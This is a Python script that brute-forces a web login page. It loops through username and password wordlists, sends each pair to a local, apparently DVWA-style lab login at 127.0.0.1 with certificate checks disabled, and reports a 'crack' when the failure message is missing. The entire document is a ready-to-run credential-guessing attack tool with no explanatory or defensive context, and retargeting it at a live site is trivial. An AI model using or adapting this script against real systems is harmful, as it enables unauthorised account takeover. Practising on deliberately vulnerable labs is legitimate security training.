import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1/dawa/login.php"
over = False
count = 0
with open(r'common_usr.txt', 'r') as names:
    for name in names:
        with open(r'common_pass.txt', 'r') as passwords:
            for password in passwords:
                params = {
                    'username':name.strip(),
                    'password':password.strip(),
                    'Login':'Login'
                }
                print('-'*20)
                print('Username:', name.strip())
                print('Password', password.strip())
                response = requests.get(url=url, params=params, verify=False)

                count = count + 1

                if 'Login failed' in response.text:
                    print("\033[31m"+"Crack failed!"+"\033[0m")
                else:
                    print("\033[32m"+"Crack sucessed!"+"\033[0m")
                    over = True
                    break
        if over == True:
            break
print(f"\033[34mAttempt {count} times in total.")